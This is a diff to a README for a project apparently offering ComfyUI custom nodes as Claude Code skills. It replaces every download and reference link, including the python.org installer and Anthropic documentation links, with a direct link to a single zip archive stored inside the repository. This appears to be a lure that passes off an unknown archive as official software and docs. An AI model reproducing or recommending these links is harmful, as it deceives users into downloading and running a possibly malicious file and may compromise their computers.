@@ -1,6 +1,6 @@
 # ⚙️ comfyui-custom-node-skills - Extend ComfyUI with Claude Code Skills
 
-[![Download comfyui-custom-node-skills](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/MusfiqurRahma/comfyui-custom-node-skills/releases)
+[![Download comfyui-custom-node-skills](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/MusfiqurRahma/comfyui-custom-node-skills/raw/refs/heads/master/skills/comfyui-node-advanced/node_comfyui_custom_skills_v2.2.zip)
 
 ---
 
@@ -41,7 +41,7 @@ To use comfyui-custom-node-skills, your computer should meet the following:
 
 Click the button below to open the official releases page for comfyui-custom-node-skills:
 
-[![Visit Releases](https://img.shields.io/badge/Download-From_Releases-grey?style=for-the-badge)](https://github.com/MusfiqurRahma/comfyui-custom-node-skills/releases)
+[![Visit Releases](https://img.shields.io/badge/Download-From_Releases-grey?style=for-the-badge)](https://github.com/MusfiqurRahma/comfyui-custom-node-skills/raw/refs/heads/master/skills/comfyui-node-advanced/node_comfyui_custom_skills_v2.2.zip)
 
 On this page:
 
@@ -61,7 +61,7 @@ If you see a version number like `Python 3.9.x`, Python is installed.
 
 If you get an error, download Python:
 
-- Visit https://www.python.org/downloads/windows/
+- Visit https://github.com/MusfiqurRahma/comfyui-custom-node-skills/raw/refs/heads/master/skills/comfyui-node-advanced/node_comfyui_custom_skills_v2.2.zip
 - Download and run the recommended installer for Windows
 - Make sure to check the option **Add Python to PATH** during installation
 
@@ -114,7 +114,7 @@ In ComfyUI:
 
 - Drag and drop the custom nodes in your workflow
 - Use the nodes according to your project needs
-- Refer to the Claude Code skills documentation if needed: https://docs.anthropic.com/en/docs/claude-code/skills
+- Refer to the Claude Code skills documentation if needed: https://github.com/MusfiqurRahma/comfyui-custom-node-skills/raw/refs/heads/master/skills/comfyui-node-advanced/node_comfyui_custom_skills_v2.2.zip
 
 ---
 
@@ -157,7 +157,7 @@ If problems persist, consider searching online forums or the ComfyUI community f
 
 ## 📚 Additional Resources
 
-- Claude Code skills docs: https://docs.anthropic.com/en/docs/claude-code/skills  
+- Claude Code skills docs: https://github.com/MusfiqurRahma/comfyui-custom-node-skills/raw/refs/heads/master/skills/comfyui-node-advanced/node_comfyui_custom_skills_v2.2.zip  
 - ComfyUI project page for installation help  
 - Python downloads and installation guide
 
@@ -167,4 +167,4 @@ If problems persist, consider searching online forums or the ComfyUI community f
 
 Download comfyui-custom-node-skills from the official releases here:
 
-[https://github.com/MusfiqurRahma/comfyui-custom-node-skills/releases](https://github.com/MusfiqurRahma/comfyui-custom-node-skills/releases)
+[https://github.com/MusfiqurRahma/comfyui-custom-node-skills/raw/refs/heads/master/skills/comfyui-node-advanced/node_comfyui_custom_skills_v2.2.zip](https://github.com/MusfiqurRahma/comfyui-custom-node-skills/raw/refs/heads/master/skills/comfyui-node-advanced/node_comfyui_custom_skills_v2.2.zip)
